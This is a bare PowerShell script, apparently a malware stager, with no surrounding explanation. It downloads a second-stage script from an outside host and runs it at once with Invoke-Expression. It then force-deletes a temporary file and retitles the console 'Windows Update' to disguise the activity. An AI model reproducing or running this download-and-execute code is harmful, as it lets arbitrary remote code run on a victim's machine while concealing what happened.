
$RemoteUrl = 'http://192.0.2.181:8080/stage2.ps1'
Invoke-Expression (New-Object System.Net.WebClient).DownloadString($RemoteUrl)
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$Host.UI.RawUI.WindowTitle = "Windows Update"
